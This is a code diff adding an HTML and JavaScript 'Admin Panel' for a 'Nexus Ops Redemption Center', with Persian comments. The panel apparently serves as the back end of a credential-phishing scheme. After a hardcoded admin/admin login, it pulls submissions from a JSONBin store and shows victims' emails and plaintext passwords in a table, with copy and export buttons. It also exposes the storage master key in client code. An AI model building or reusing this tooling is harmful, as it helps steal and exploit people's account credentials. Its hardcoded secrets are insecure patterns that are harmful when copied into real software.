@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Panel — Nexus Ops</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: 'Segoe UI', Tahoma, sans-serif;
+    background: #0a0a0a;
+    color: #eee;
+    min-height: 100vh;
+    padding: 24px;
+  }
+
+  h1 {
+    color: #FFE600;
+    font-size: 1.8rem;
+    margin-bottom: 8px;
+  }
+
+  .subtitle {
+    color: #888;
+    margin-bottom: 24px;
+    font-size: 0.9rem;
+  }
+
+  /* ================= LOGIN ================= */
+  #loginScreen {
+    max-width: 420px;
+    margin: 100px auto;
+    background: #111;
+    border: 1px solid #232323;
+    border-radius: 6px;
+    padding: 32px;
+    position: relative;
+  }
+
+  #loginScreen::before {
+    content: "";
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 2px;
+    background: linear-gradient(90deg, #FFE600, transparent 70%);
+  }
+
+  #loginScreen h1 {
+    text-align: center;
+    margin-bottom: 6px;
+  }
+
+  .login-sub {
+    text-align: center;
+    color: #666;
+    font-size: 0.85rem;
+    margin-bottom: 24px;
+  }
+
+  label {
+    display: block;
+    font-size: 0.78rem;
+    font-weight: 700;
+    letter-spacing: 0.1em;
+    color: #888;
+    margin-bottom: 8px;
+    text-transform: uppercase;
+  }
+
+  input {
+    width: 100%;
+    padding: 13px 14px;
+    background: #0a0a0a;
+    border: 1px solid #2e2e2e;
+    border-radius: 3px;
+    color: #fff;
+    font-size: 1rem;
+    margin-bottom: 16px;
+    outline: none;
+    transition: border-color 0.15s, box-shadow 0.15s;
+  }
+
+  input:focus {
+    border-color: #FFE600;
+    box-shadow: 0 0 0 3px rgba(255, 230, 0, 0.12);
+  }
+
+  button {
+    padding: 12px 24px;
+    background: #FFE600;
+    color: #0a0a0a;
+    border: none;
+    font-weight: 700;
+    font-size: 0.95rem;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    cursor: pointer;
+    border-radius: 3px;
+    transition: background 0.15s, transform 0.1s;
+  }
+
+  button:hover { background: #fff05c; transform: translateY(-1px); }
+  button:active { transform: translateY(0); }
+
+  button.secondary { background: #232323; color: #eee; }
+  button.secondary:hover { background: #2e2e2e; }
+
+  .btn-full { width: 100%; margin-top: 8px; }
+
+  .error-msg {
+    color: #FF4D4D;
+    font-size: 0.85rem;
+    margin-top: 12px;
+    text-align: center;
+    min-height: 18px;
+  }
+
+  /* ================= PANEL ================= */
+  #adminPanel { max-width: 1400px; margin: 0 auto; }
+
+  .panel-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+    flex-wrap: wrap;
+    gap: 12px;
+    margin-bottom: 20px;
+    padding-bottom: 16px;
+    border-bottom: 1px solid #232323;
+  }
+
+  .panel-actions { display: flex; gap: 10px; flex-wrap: wrap; }
+
+  .stats {
+    display: flex;
+    gap: 16px;
+    margin-bottom: 20px;
+    flex-wrap: wrap;
+  }
+
+  .stat-card {
+    background: #111;
+    border: 1px solid #232323;
+    border-radius: 4px;
+    padding: 14px 20px;
+    min-width: 140px;
+  }
+
+  .stat-card .label {
+    color: #888;
+    font-size: 0.72rem;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    margin-bottom: 4px;
+  }
+
+  .stat-card .value {
+    color: #FFE600;
+    font-size: 1.5rem;
+    font-weight: 700;
+    word-break: break-word;
+  }
+
+  /* ================= TABLE ================= */
+  .table-wrap {
+    background: #111;
+    border: 1px solid #232323;
+    border-radius: 6px;
+    overflow-x: auto;
+  }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 0.9rem;
+  }
+
+  th {
+    background: #1a1a1a;
+    color: #FFE600;
+    padding: 14px 16px;
+    text-align: left;
+    font-weight: 600;
+    letter-spacing: 0.05em;
+    text-transform: uppercase;
+    font-size: 0.75rem;
+    border-bottom: 1px solid #232323;
+    white-space: nowrap;
+  }
+
+  td {
+    padding: 12px 16px;
+    border-bottom: 1px solid #1a1a1a;
+    word-break: break-word;
+  }
+
+  tr:last-child td { border-bottom: none; }
+  tr:hover td { background: #151515; }
+
+  .empty {
+    padding: 50px;
+    text-align: center;
+    color: #666;
+    font-size: 0.95rem;
+  }
+
+  .copy-btn {
+    background: transparent;
+    border: 1px solid #2e2e2e;
+    color: #888;
+    padding: 4px 10px;
+    font-size: 0.72rem;
+    border-radius: 3px;
+    cursor: pointer;
+    font-family: inherit;
+  }
+
+  .copy-btn:hover { color: #FFE600; border-color: #FFE600; }
+
+  /* ================= JSON VIEW ================= */
+  #jsonView {
+    background: #0d0d0d;
+    border: 1px solid #232323;
+    border-radius: 6px;
+    padding: 20px;
+    font-family: 'Courier New', monospace;
+    font-size: 0.85rem;
+    color: #4CFF8A;
+    white-space: pre-wrap;
+    word-break: break-word;
+    max-height: 600px;
+    overflow-y: auto;
+    display: none;
+  }
+
+  /* ================= TOAST ================= */
+  .toast {
+    position: fixed;
+    bottom: 30px;
+    right: 30px;
+    background: #4CFF8A;
+    color: #0a0a0a;
+    padding: 12px 20px;
+    border-radius: 4px;
+    font-weight: 600;
+    opacity: 0;
+    transform: translateY(20px);
+    transition: opacity 0.25s, transform 0.25s;
+    pointer-events: none;
+    z-index: 999;
+  }
+
+  .toast.show { opacity: 1; transform: translateY(0); }
+
+  @media (max-width: 600px) {
+    th, td { padding: 10px 8px; font-size: 0.78rem; }
+    h1 { font-size: 1.4rem; }
+    .stat-card { flex: 1 1 100%; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ================= LOGIN ================= -->
+<div id="loginScreen">
+  <h1>🔒 Admin Access</h1>
+  <p class="login-sub">Nexus Ops Redemption Center</p>
+
+  <label for="adminEmail">Email</label>
+  <input type="email" id="adminEmail" placeholder="admin@gmail.com" autocomplete="off">
+
+  <label for="adminPass">Password</label>
+  <input type="password" id="adminPass" placeholder="Enter password" autocomplete="off">
+
+  <button class="btn-full" onclick="login()">Enter Panel</button>
+  <div class="error-msg" id="loginError"></div>
+</div>
+
+<!-- ================= PANEL ================= -->
+<div id="adminPanel" style="display:none;">
+  <div class="panel-header">
+    <div>
+      <h1>📋 Submissions</h1>
+      <p class="subtitle" id="welcomeMsg">Welcome, admin</p>
+    </div>
+    <div class="panel-actions">
+      <button onclick="loadData()">🔄 Refresh</button>
+      <button class="secondary" onclick="toggleJson()" id="jsonBtn">📄 Show JSON</button>
+      <button class="secondary" onclick="exportJson()">⬇️ Export</button>
+      <button class="secondary" onclick="logout()">Logout</button>
+    </div>
+  </div>
+
+  <div class="stats">
+    <div class="stat-card">
+      <div class="label">Total Submissions</div>
+      <div class="value" id="statTotal">0</div>
+    </div>
+    <div class="stat-card">
+      <div class="label">Last Entry</div>
+      <div class="value" id="statLast" style="font-size:1rem;">—</div>
+    </div>
+    <div class="stat-card">
+      <div class="label">Logged in as</div>
+      <div class="value" id="statUser" style="font-size:0.95rem;">—</div>
+    </div>
+  </div>
+
+  <div id="jsonView"></div>
+
+  <div class="table-wrap" id="tableWrap">
+    <table>
+      <thead>
+        <tr>
+          <th style="width:50px;">#</th>
+          <th style="width:180px;">Time</th>
+          <th>Email</th>
+          <th>Password</th>
+          <th style="width:80px;">Copy</th>
+        </tr>
+      </thead>
+      <tbody id="tbody">
+        <tr><td colspan="5" class="empty">Loading...</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<div class="toast" id="toast">Copied!</div>
+
+<script>
+/* =========================================================
+   ADMIN PANEL — Nexus Ops
+   ========================================================= */
+
+// ⚠️ این دو مقدار را با مقادیر JSONBin خودت جایگزین کن
+const JSONBIN_BIN_ID = "YOUR_BIN_ID_HERE";
+const JSONBIN_MASTER_KEY = "YOUR_MASTER_KEY_HERE";
+
+// ⚠️ اطلاعات لاگین ادمین
+const ADMIN_EMAIL = "admin@gmail.com";
+const ADMIN_PASSWORD = "admin";
+
+let currentUser = null;
+let allSubmissions = [];
+let jsonVisible = false;
+
+function login() {
+  const email = document.getElementById('adminEmail').value.trim();
+  const pass = document.getElementById('adminPass').value.trim();
+  const errEl = document.getElementById('loginError');
+
+  errEl.textContent = '';
+
+  if (!email || !pass) {
+    errEl.textContent = 'Please enter both email and password.';
+    return;
+  }
+
+  if (email !== ADMIN_EMAIL || pass !== ADMIN_PASSWORD) {
+    errEl.textContent = '❌ Invalid credentials.';
+    return;
+  }
+
+  currentUser = email;
+  sessionStorage.setItem('nexus_admin_user', email);
+
+  document.getElementById('loginScreen').style.display = 'none';
+  document.getElementById('adminPanel').style.display = 'block';
+  document.getElementById('welcomeMsg').textContent = 'Welcome, ' + email;
+  document.getElementById('statUser').textContent = email;
+
+  loadData();
+}
+
+function logout() {
+  currentUser = null;
+  sessionStorage.removeItem('nexus_admin_user');
+  document.getElementById('adminEmail').value = '';
+  document.getElementById('adminPass').value = '';
+  document.getElementById('loginError').textContent = '';
+  document.getElementById('loginScreen').style.display = 'block';
+  document.getElementById('adminPanel').style.display = 'none';
+  document.getElementById('jsonView').style.display = 'none';
+  jsonVisible = false;
+  document.getElementById('jsonBtn').textContent = '📄 Show JSON';
+}
+
+async function loadData() {
+  if (!currentUser) return;
+
+  try {
+    const res = await fetch(
+      `https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`,
+      {
+        headers: {
+          'X-Master-Key': JSONBIN_MASTER_KEY,
+          'X-Bin-Meta': 'false'
+        }
+      }
+    );
+
+    if (!res.ok) throw new Error('Failed to load');
+
+    const data = await res.json();
+    allSubmissions = Array.isArray(data) ? data : [];
+
+    // جدیدترین اول
+    allSubmissions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+
+    renderTable();
+    renderStats();
+    if (jsonVisible) renderJson();
+  } catch (err) {
+    console.error(err);
+    document.getElementById('tbody').innerHTML =
+      '<tr><td colspan="5" class="empty">❌ Failed to load data</td></tr>';
+  }
+}
+
+function renderTable() {
+  const tbody = document.getElementById('tbody');
+  tbody.innerHTML = '';
+
+  if (allSubmissions.length === 0) {
+    tbody.innerHTML = `
+      <tr>
+        <td colspan="5" class="empty">
+          <div style="font-size:2.5rem; margin-bottom:10px; opacity:0.4;">📭</div>
+          No submissions yet.
+        </td>
+      </tr>
+    `;
+    return;
+  }
+
+  allSubmissions.forEach((sub, i) => {
+    const tr = document.createElement('tr');
+    tr.innerHTML = `
+      <td>${i + 1}</td>
+      <td>${formatTime(sub.timestamp)}</td>
+      <td>${escapeHtml(sub.email)}</td>
+      <td>${escapeHtml(sub.password)}</td>
+      <td><button class="copy-btn" onclick="copyRow(${i})">Copy</button></td>
+    `;
+    tbody.appendChild(tr);
+  });
+}
+
+function renderStats() {
+  document.getElementById('statTotal').textContent = allSubmissions.length;
+  document.getElementById('statLast').textContent =
+    allSubmissions.length > 0 ? formatTime(allSubmissions[0].timestamp) : '—';
+}
+
+function toggleJson() {
+  jsonVisible = !jsonVisible;
+  const view = document.getElementById('jsonView');
+  const btn = document.getElementById('jsonBtn');
+  const table = document.getElementById('tableWrap');
+
+  if (jsonVisible) {
+    renderJson();
+    view.style.display = 'block';
+    table.style.display = 'none';
+    btn.textContent = '📊 Show Table';
+  } else {
+    view.style.display = 'none';
+    table.style.display = 'block';
+    btn.textContent = '📄 Show JSON';
+  }
+}
+
+function renderJson() {
+  document.getElementById('jsonView').textContent =
+    JSON.stringify(allSubmissions, null, 2);
+}
+
+function copyRow(i) {
+  const sub = allSubmissions[i];
+  const text = `Email: ${sub.email}\nPassword: ${sub.password}\nTime: ${sub.timestamp}`;
+
+  navigator.clipboard.writeText(text).then(() => {
+    showToast('Copied!');
+  }).catch(() => {
+    const ta = document.createElement('textarea');
+    ta.value = text;
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+    showToast('Copied!');
+  });
+}
+
+function exportJson() {
+  if (allSubmissions.length === 0) {
+    showToast('Nothing to export');
+    return;
+  }
+
+  const blob = new Blob(
+    [JSON.stringify(allSubmissions, null, 2)],
+    { type: 'application/json' }
+  );
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = `nexus_submissions_${Date.now()}.json`;
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(url);
+
+  showToast('Downloaded!');
+}
+
+function formatTime(iso) {
+  if (!iso) return '—';
+  try {
+    const d = new Date(iso);
+    if (isNaN(d.getTime())) return String(iso);
+    return d.toLocaleString('en-GB', {
+      year: 'numeric', month: '2-digit', day: '2-digit',
+      hour: '2-digit', minute: '2-digit'
+    });
+  } catch {
+    return String(iso);
+  }
+}
+
+function escapeHtml(str) {
+  if (str === null || str === undefined) return '';
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
+}
+
+function showToast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 1800);
+}
+
+window.addEventListener('DOMContentLoaded', () => {
+  const saved = sessionStorage.getItem('nexus_admin_user');
+  if (saved === ADMIN_EMAIL) {
+    currentUser = saved;
+    document.getElementById('adminEmail').value = saved;
+    document.getElementById('adminPass').value = ADMIN_PASSWORD;
+    login();
+  }
+
+  document.getElementById('adminPass').addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') login();
+  });
+  document.getElementById('adminEmail').addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') login();
+  });
+});
+</script>
+
+</body>
+</html>
